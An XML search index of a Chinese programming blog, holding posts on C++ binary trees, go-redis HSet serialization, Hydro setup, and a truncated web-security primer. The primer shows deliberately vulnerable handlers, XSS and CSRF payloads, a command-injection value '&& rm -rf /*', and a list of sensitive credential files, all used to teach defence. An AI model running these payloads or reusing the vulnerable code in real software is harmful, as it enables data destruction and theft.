<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>C/C++ 二叉树</title>
    <url>//C-C-Binary-Trees/</url>
    <content><![CDATA[<p>对于数据结构初学者二叉树是一个很好的练习题目，这里记录一下二叉树的一些操作。</p>
<span id="more"></span>

<p>查找二叉树有一个特性</p>
<blockquote>
<p>对于所有的节点，都满足左子树上的所有节点都比自己的小，而右子树上的所有节点都比自己大<br>————《挑战程序设计竞赛第二版》P78</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">TreeNode</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">TreeNode</span> *LT, *RT;</span><br><span class="line">&#125;TreeNode, *TreeList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个叶子节点</span></span><br><span class="line"><span class="function">TreeNode* <span class="title">creatTree</span><span class="params">(<span class="type">int</span> pData)</span></span>&#123;</span><br><span class="line">    TreeNode *tree = (TreeNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(TreeNode));</span><br><span class="line">    tree-&gt;data = pData;</span><br><span class="line">    tree-&gt;LT = <span class="literal">NULL</span>;</span><br><span class="line">    tree-&gt;RT = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> tree;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">addLeaf</span><span class="params">(TreeList &amp;node, <span class="type">int</span> deep)</span></span>&#123;</span><br><span class="line">    <span class="comment">//传参需要注意，二叉树是指针类型的，节点本身就是一个指针：*node。所以需要二级指针才能改变二叉树的内容</span></span><br><span class="line">    <span class="comment">//TreeNode *node = NULL;</span></span><br><span class="line">    <span class="type">char</span> input;</span><br><span class="line">    cin &gt;&gt; input;</span><br><span class="line">    <span class="keyword">if</span>(input != <span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">        node = <span class="built_in">creatTree</span>((<span class="type">int</span>)input);</span><br><span class="line">        <span class="built_in">addLeaf</span>(node-&gt;LT, deep + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">addLeaf</span>(node-&gt;RT, deep + <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        node = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">treeInfo</span><span class="params">(TreeNode *tree, <span class="type">int</span> deep)</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;deep: &quot;</span> &lt;&lt; deep &lt;&lt; <span class="string">&quot;, data: &quot;</span> &lt;&lt; (<span class="type">char</span>)tree-&gt;data &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">if</span> (tree-&gt;LT != <span class="literal">NULL</span>) <span class="built_in">treeInfo</span>(tree-&gt;LT, deep + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (tree-&gt;RT != <span class="literal">NULL</span>) <span class="built_in">treeInfo</span>(tree-&gt;RT, deep + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode *<span class="title">findValue</span><span class="params">(TreeNode *node, <span class="type">int</span> value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (node-&gt;data == value) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;ok, find it.&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">findValue</span>(node-&gt;data &lt; value ? node-&gt;RT : node-&gt;LT, value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> data;</span><br><span class="line">    TreeList tree, temp;</span><br><span class="line">    <span class="built_in">addLeaf</span>(tree, <span class="number">0</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;start out info:&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">treeInfo</span>(tree, <span class="number">0</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;end out info&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;input a num to find: &quot;</span>;</span><br><span class="line">    cin &gt;&gt; data;</span><br><span class="line">    temp = <span class="built_in">findValue</span>(tree, data);</span><br><span class="line">    <span class="keyword">if</span> (!temp) cout &lt;&lt; <span class="string">&quot;no find it.&quot;</span> &lt;&lt;endl;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;find in &quot;</span> &lt;&lt; &amp;temp &lt;&lt; <span class="string">&quot;, data: &quot;</span> &lt;&lt; (<span class="type">char</span>)temp-&gt;data &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>Golang 库 Redis 对 data 类型的支持</title>
    <url>//Go%20Redis%20Lib%20Serialize%20Struct/</url>
    <content><![CDATA[<p><code>go-redis</code> 库对于 <code>HSet</code> 方法支持的数据类型为 <code>interface&#123;&#125;</code>, 查看下支持哪些类型的</p>
<span id="more"></span>

<h2 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h2><blockquote>
<p>github.com&#x2F;go-redis&#x2F;redis&#x2F;v8 v8.11.5</p>
<p><a href="https://pkg.go.dev/github.com/go-redis/redis/v8@v8.11.5#Client.HSet">https://pkg.go.dev/github.com/go-redis/redis/v8@v8.11.5#Client.HSet</a></p>
</blockquote>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Son <span class="keyword">struct</span> &#123;</span><br><span class="line">    A <span class="type">int</span></span><br><span class="line">    B <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="type">string</span></span><br><span class="line">    Age  <span class="type">int</span></span><br><span class="line">    Son  []Son</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestSerialize</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    redis := redis.NewClient(&amp;redis.Options&#123;</span><br><span class="line">        Addr: <span class="string">&quot;localhost:6379&quot;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    data := Person&#123;</span><br><span class="line">        Name: <span class="string">&quot;zhangsan&quot;</span>,</span><br><span class="line">        Age:  <span class="number">18</span>,</span><br><span class="line">        Son: []Son&#123;</span><br><span class="line">            &#123;</span><br><span class="line">                A: <span class="number">1</span>,</span><br><span class="line">                B: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                A: <span class="number">2</span>,</span><br><span class="line">                B: <span class="string">&quot;b&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    redis.HSet(context.Background(), <span class="string">&quot;person&quot;</span>, <span class="string">&quot;name&quot;</span>, data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p>可以通过跳转看到函数内部实现如下</p>
<p><img src="/./Go%20Redis%20Lib%20Serialize%20Struct/image.png" alt="HSet code" loading="lazy"></p>
<p><code>appendArgs</code> 函数将 <code>args</code> 追加到 <code>values</code> 参数的前面后生成一个 <code>IntCmd</code> 对象，传递给 <code>c</code> 进行处理（c的定义可以在 <code>NewClient</code> 函数中看到其为 <code>Client</code> 对象）</p>
<p><img src="/./Go%20Redis%20Lib%20Serialize%20Struct/image-1.png" alt="NewClient Code" loading="lazy"></p>
<p>通过调试追踪可以确认 <code>c</code> 为 <code>Client</code> 对象，<code>c</code> 的 <code>Process</code> 方法会将 <code>IntCmd</code> 对象传递给 <code>Process</code> 方法进行处理</p>
<p><img src="/./Go%20Redis%20Lib%20Serialize%20Struct/image-2.png" alt="alt text" loading="lazy"></p>
<p>继续查看 <code>process</code> 方法的实现，可以看到跳到了这里</p>
<p><img src="/./Go%20Redis%20Lib%20Serialize%20Struct/image-3.png" alt="process code" loading="lazy"></p>
<p>由于没有设置 <code>hook</code> 所以直接进入 <code>c.baseClient.process</code> 方法执行</p>
<p><img src="/./Go%20Redis%20Lib%20Serialize%20Struct/image-4.png" alt="baseClient process code" loading="lazy"></p>
<p>这部分进行重复尝试，进入 <code>c._process</code> 方法查看代码</p>
<p><img src="/./Go%20Redis%20Lib%20Serialize%20Struct/image-5.png" alt="real code" loading="lazy"></p>
<p>忽略头部的睡眠代码，直接下面</p>
<p><code>c.withConn</code> 传递了一个匿名函数，在方法中获取到一个 <code>conn</code> 对象，然后调用该函数</p>
<p><img src="/./Go%20Redis%20Lib%20Serialize%20Struct/image-6.png" alt="exec hand" loading="lazy"></p>
<p>在 <code>withConn</code> 通过传递过来的 <code>fn</code> 函数对数据进行序列化处理</p>
<p><img src="/./Go%20Redis%20Lib%20Serialize%20Struct/image-7.png" alt="alt text" loading="lazy"></p>
<p>序列化的具体实现可以发现是调用 <code>writeCmd</code> 方法，进入该方法一路跳转可以看到具体的执行代码</p>
<p><img src="/./Go%20Redis%20Lib%20Serialize%20Struct/image-8.png" alt="alt text" loading="lazy"></p>
<p>最终兜底处理</p>
<p><img src="/./Go%20Redis%20Lib%20Serialize%20Struct/image-9.png" alt="alt text" loading="lazy"></p>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p><code>go-redis</code> 库对于 <code>HSet</code> 方法支持的数据类型为 <code>interface&#123;&#125;</code>，在传递数据时会调用 <code>writeCmd</code> 方法进行序列化处理，最终通过 <code>conn</code> 对象将数据传递给 <code>redis</code> 服务端</p>
<p>支持的数据类型基本为基础数据类型，如果是自定义的结构体需要自己实现序列化和反序列化的方式</p>
]]></content>
      <tags>
        <tag>redis, golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Hydro二开笔记 前端篇</title>
    <url>//Hydro-2-Custom-Development-Notes-Frontend-Section/</url>
    <content><![CDATA[<p>Hydro是一个开源的在线评测系统，支持多种语言和评测方式，其良好的用户体验和丰富的功能使其成为一个优秀的评测系统。本文记录了Hydro的二次开发笔记，主要是前端部分。</p>
<span id="more"></span>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
<li><p>react（JavaScript框架）</p>
</li>
<li><p>stylues（Nodejs的css处理器）</p>
</li>
</ul>
<h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><ul>
<li>Nodejs 16.14.2 hydro的workspace需要至少node16，而17会出现问题没细研究，用16了</li>
<li>VSCode</li>
<li>Git</li>
<li>Mongodb</li>
<li>Linux 如果习惯win推荐使用WSL</li>
</ul>
<p>然后安装yarn及npx</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g yarn</span><br><span class="line">yarn global add npx</span><br><span class="line">npm install -g pm2</span><br></pre></td></tr></table></figure>

<p>*<strong>确保安装过程中无错误后继续下一步</strong></p>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>我使用的环境是Ubuntu20.4，安装的版本为5.0，如果同需求可以到<a href="https://www.mongodb.com/docs/manual/administration/install-on-linux/">Install MongoDB Community Edition on Linux — MongoDB Manual</a> 参考安装方法</p>
<p>*<strong>接下来步骤均在root下执行</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -qO - https://www.mongodb.org/static/pgp/server-5.0.asc | sudo apt-key add -  #添加证书</span><br><span class="line">echo &quot;deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/5.0 multiverse&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-5.0.list #添加mongodb安装源</span><br><span class="line">apt-get update</span><br><span class="line">sudo apt-get install -y mongodb-org</span><br></pre></td></tr></table></figure>

<h3 id="启动MongoDB"><a href="#启动MongoDB" class="headerlink" title="启动MongoDB"></a>启动MongoDB</h3><p>默认情况下 MongoDB 启动后会初始化以下两个目录：</p>
<ul>
<li>数据存储目录：&#x2F;var&#x2F;lib&#x2F;mongodb</li>
<li>日志文件目录：&#x2F;var&#x2F;log&#x2F;mongodb</li>
</ul>
<p>在启动前可以先创建这两个目录并设置当前用户有读写权限：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /var/lib/mongo</span><br><span class="line">sudo mkdir -p /var/log/mongodb</span><br><span class="line">sudo chown `whoami` /var/lib/mongo     # 设置权限</span><br><span class="line">sudo chown `whoami` /var/log/mongodb   # 设置权限</span><br></pre></td></tr></table></figure>

<p>接下来启动 Mongodb 服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mongod --dbpath /var/lib/mongo --logpath /var/log/mongodb/mongod.log --fork</span><br></pre></td></tr></table></figure>

<p>打开 &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;mongod.log 文件看到以下信息，说明启动成功。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">tail</span> -10f /var/log/mongodb/mongod.log</span></span><br><span class="line">2020-07-09T12:20:17.391+0800 I  NETWORK  [listener] Listening on /tmp/mongodb-27017.sock</span><br><span class="line">2020-07-09T12:20:17.392+0800 I  NETWORK  [listener] Listening on 127.0.0.1</span><br><span class="line">2020-07-09T12:20:17.392+0800 I  NETWORK  [listener] waiting for connections on port 27017</span><br></pre></td></tr></table></figure>

<h2 id="拉取源码"><a href="#拉取源码" class="headerlink" title="拉取源码"></a>拉取源码</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/hydro-dev/Hydro.git /root/Hydro --recursive # 可以fork原仓库后拉取到本地</span><br><span class="line">cd /root/Hydro # 进入工作目录</span><br><span class="line">yarn # 安装依赖包</span><br><span class="line">yarn build:ui:production # 编译前端</span><br></pre></td></tr></table></figure>

<h2 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pm2 start packages/hydrooj/bin/hydrooj.js</span><br></pre></td></tr></table></figure>

<p>看到状态为绿色启动成功以后，就可以通过 <code>http://[::1]:8888</code> 访问</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
<p><a href="https://hydro.js.org/dev/">开发环境部署 | Hydro</a></p>
<p><a href="https://www.runoob.com/mongodb/mongodb-linux-install.html">Linux 平台安装 MongoDB | 菜鸟教程 (runoob.com)</a></p>
<p><a href="https://www.mongodb.com/docs/manual/administration/install-on-linux/">Install MongoDB Community Edition on Linux — MongoDB Manual</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>hydro</tag>
      </tags>
  </entry>
  <entry>
    <title>Web 开发的安全之旅</title>
    <url>//Journey-to-Web-Development-Security/</url>
    <content><![CDATA[<p>在青训营的学习中学到的一些Web开发中的安全问题以及防御方法，将对这些内容进行总结。</p>
<span id="more"></span>

<h2 id="攻击篇"><a href="#攻击篇" class="headerlink" title="攻击篇"></a>攻击篇</h2><h3 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS(跨站脚本攻击)"></a>XSS(跨站脚本攻击)</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>开发者盲目信息用户传递的信息而不做处理</p>
<p>当用户输入时，开发者盲目的把用户输入的信息传递给服务器，服务器把用户输入的信息转换成HTML标签，然后把转换后的HTML标签传递给用户</p>
<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul>
<li>难以感知 没有UI呈现</li>
<li>窃取用户信息(cookies &#x2F; token)</li>
<li>绘制 UI (例如弹窗), 诱使用户填写私密信息</li>
</ul>
<h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><h5 id="存储型XSSI-Stored-XSS"><a href="#存储型XSSI-Stored-XSS" class="headerlink" title="存储型XSSI(Stored XSS)"></a>存储型XSSI(Stored XSS)</h5><ul>
<li>恶意脚本被存储在数据库中</li>
<li>访问页面 -&gt; 读数据 &#x3D; 执行恶意脚本被攻击</li>
<li><strong>危害性极大, 可对所有访问这个页面的用户进行攻击</strong></li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">async</span> <span class="title function_">submit</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; content, id &#125; = ctx.<span class="property">request</span>.<span class="property">body</span>; <span class="comment">// 没有对content 过滤</span></span><br><span class="line">    <span class="keyword">await</span> db.<span class="title function_">save</span>(&#123;</span><br><span class="line">        content,</span><br><span class="line">        id</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">public <span class="keyword">async</span> <span class="title function_">render</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; content &#125; = <span class="keyword">await</span> db.<span class="title function_">query</span>(&#123;</span><br><span class="line">        <span class="attr">id</span>: ctx.<span class="property">query</span>.<span class="property">id</span></span><br><span class="line">    &#125;);</span><br><span class="line"><span class="comment">// 没有对content 过滤</span></span><br><span class="line">ctx.<span class="property">body</span> = <span class="string">`&lt;div&gt;<span class="subst">$&#123;content&#125;</span>&lt;/div&gt;`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当有用户恶意提交 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 时，浏览者访问页面会读取到 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，并且会执行 <code>alert(1)</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 正常 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- xss攻击 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="反射型XSS-Reflected-XSS"><a href="#反射型XSS-Reflected-XSS" class="headerlink" title="反射型XSS(Reflected XSS)"></a>反射型XSS(Reflected XSS)</h5><ul>
<li>不涉及数据库</li>
<li>从 URL 上攻击</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">async</span> <span class="title function_">render</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; content &#125; = ctx.<span class="property">query</span>; <span class="comment">// 没有对content 过滤</span></span><br><span class="line">    ctx.<span class="property">body</span> = <span class="string">`&lt;div&gt;<span class="subst">$&#123;content&#125;</span>&lt;/div&gt;`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当用户访问 <code>http://localhost:3000/?content=&lt;script&gt;alert(1)&lt;/script&gt;</code> 时，页面会生成 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，用户访问后执行 <code>alert(1)</code></p>
<h5 id="DOM-based-XSS"><a href="#DOM-based-XSS" class="headerlink" title="DOM-based XSS"></a>DOM-based XSS</h5><p>完全不需要服务器参与</p>
<p>恶意攻击的发起 + 执行都在浏览器完成</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> content = <span class="keyword">new</span> <span class="title function_">URL</span>(location.<span class="property">href</span>).<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&#x27;content&#x27;</span>); <span class="comment">// 没有对content 过滤</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>).<span class="property">innerHTML</span> = content;</span><br></pre></td></tr></table></figure>

<p>当用户访问<code>http://localhost:3000/?content=&lt;script&gt;alert(1)&lt;/script&gt;</code> 时，界面读取URL参数时会读取到 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 插入到页面中发从而执行恶意脚本</p>
<h5 id="Mutation-based-XSS"><a href="#Mutation-based-XSS" class="headerlink" title="Mutation-based XSS"></a>Mutation-based XSS</h5><ul>
<li>利用了浏览器渲染DOM的特性</li>
<li>不同的浏览器会有不同的实现，按浏览器进行攻击</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- XSS检查器: 无问题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">title</span>=<span class="string">&quot;&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 渲染后 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">title</span>=<span class="string">&quot;&lt;/noscript&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;img src=&quot;</span><span class="attr">x</span>&quot; <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">    &quot;&quot;&gt;&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Cross-site-request-forgery-CSRF"><a href="#Cross-site-request-forgery-CSRF" class="headerlink" title="Cross-site request forgery(CSRF)"></a>Cross-site request forgery(CSRF)</h3><ul>
<li>在用户不知情的前提下</li>
<li>利用用户权限(Cookies)</li>
<li>构造指定HTTP请求，窃取或修改用户敏感信息</li>
</ul>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><img src="/Journey-to-Web-Development-Security/9ab53341a3324607ab5bcda094d76e79~tplv-k3u1fbpfcp-watermark.png" class="">

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 用户点击 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 点击后向黑客转账100元 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://bank.com/transfer?to=hacker&amp;amount=100&quot;</span>&gt;</span> 点我抽奖 <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 用户访问后执行 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 加载图片时向黑客转账100元 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://bank.com/transfer?to=hacker&amp;amount=100&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 表单 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 表单隐藏用户无法发现 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://bank.com/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><h4 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h4><img src="/Journey-to-Web-Development-Security/04975e27e5d84a02be6baf32b6367285~tplv-k3u1fbpfcp-watermark.png" class="">

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">async</span> <span class="title function_">renderForm</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, form_id &#125; = ctx.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">const</span> sql = <span class="string">`SELECT * FROM users WHERE username=&#x27;<span class="subst">$&#123;username&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">    AND form_id=&#x27;<span class="subst">$&#123;form_id&#125;</span>&#x27;`</span>;</span><br><span class="line">    <span class="keyword">const</span> users = <span class="keyword">await</span> db.<span class="title function_">query</span>(sql);</span><br><span class="line">    ctx.<span class="property">body</span> = users;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当用户输入用户名为 <code>any; DROP TABLE table</code> 时，数据库会执行 <code>SELECT * FROM users WHERE username=&#39; any; DROP TABLE table&#39;</code>，从而造成删库</p>
<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><ul>
<li>CLI</li>
<li>OS command</li>
<li>Server-side Request Forgery(SSRF), 服务端伪造请求 (严格意义上非注入，但原理类似)</li>
</ul>
<h5 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用于转换视频</span></span><br><span class="line">public <span class="keyword">async</span> <span class="title function_">convertVideo</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; video, options &#125; = ctx.<span class="property">query</span>;</span><br><span class="line">    <span class="title function_">exec</span>(<span class="string">`convert-cli <span class="subst">$&#123;video&#125;</span> <span class="subst">$&#123;options&#125;</span>`</span>);</span><br><span class="line">    ctx.<span class="property">body</span> = <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当用户请求参数为 <code>http://localhost:3000/?video=video.mp4&amp;options=&amp;&amp; rm -rf /*</code> 时，会执行 <code>convert-cli video.mp4 &amp;&amp; rm -rf /*</code> 从而造成服务器上的文件被删除</p>
<h5 id="读取修改"><a href="#读取修改" class="headerlink" title="读取修改"></a>读取修改</h5><p>重要文件被暴露</p>
<ul>
<li>&#x2F;etc&#x2F;passwd</li>
<li>&#x2F;etc&#x2F;shadow</li>
<li>~&#x2F;.ssh</li>
<li>&#x2F;etc&#x2F;apache2&#x2F;httpd.conf</li>
<li>&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</li>
<li>其它私密文件…</li>
</ul>
<p>假如黑客可以修改nginx.conf文件，添加一个反向代理</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://localhost:3000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>黑客将我们网站的访问流量转发到其竞争对手，从而造成竞争对手服务器流量过大而宕机</p>
<h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">async</span> <span class="title function_">webhook</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="comment">// callback 可能是内网 URL</span></span><br><span class="line">    <span class="comment">// e.g http://secret.com/get_employ_payrolls</span></span><br><span class="line">    ctx.<span class="property">body</span> = <span class="keyword">await</span> <span class="title function_">fetch</span>(ctx.<span class="property">query</span>.<span class="property">callback</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>通过构造某种特殊的请求，导致服务器资源被显著消耗，来不及响应更多请求，导致请求积压，进而造成雪崩效应</p>
<h4 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h4><p>知识补充</p>
